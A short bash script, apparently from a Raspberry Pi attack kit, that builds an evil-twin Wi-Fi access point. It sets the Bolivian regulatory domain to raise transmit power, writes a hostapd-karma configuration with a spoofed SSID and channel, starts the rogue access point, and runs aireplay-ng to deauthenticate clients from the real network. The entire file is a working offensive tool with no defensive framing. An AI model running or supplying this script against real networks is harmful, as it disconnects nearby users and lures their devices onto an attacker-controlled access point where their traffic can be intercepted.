#! /bin/bash
#

evilSSID=$1
evilMAC=$2

evilMAC2="9C:97:26:07:FF:AA"

evilChan=$3

echo $evilSSID
echo $evilMAC
echo $evilChan



service dnsmasq stop

## Bring interfaces down so that
## BO country registration can be SET this
## allows for higher signal output
ifconfig wlan1 down

sleep 1s

#### SSID Doesnt show up when this is used ?????????????????????????????????///

iw reg set BO
ifconfig wlan1 up

ifconfig wlan1 10.0.0.1 netmask 255.255.255.0
sleep 1s
service dnsmasq start

cp /rasberryPwnPi/hostapd-1.0-karma/hostapd/hostapd-evil-defaults.conf /rasberryPwnPi/hostapd-1.0-karma/hostapd/hostapd-evil.conf

echo bssid=$evilMAC2 >> /rasberryPwnPi/hostapd-1.0-karma/hostapd/hostapd-evil.conf
echo channel=$evilChan >> /rasberryPwnPi/hostapd-1.0-karma/hostapd/hostapd-evil.conf
echo ssid=$evilSSID >> /rasberryPwnPi/hostapd-1.0-karma/hostapd/hostapd-evil.conf

/rasberryPwnPi/hostapd-1.0-karma/hostapd/hostapd -dd /rasberryPwnPi/hostapd-1.0-karma/hostapd/hostapd-evil.conf & # -f /logs/hostapd_1.0_karma_wlan1_eth.log &


sleep 1s

airmon-ng start wlan0

sleep 9s

aireplay-ng --deauth 5 -a $evilMAC mon0 --ignore-negative-one
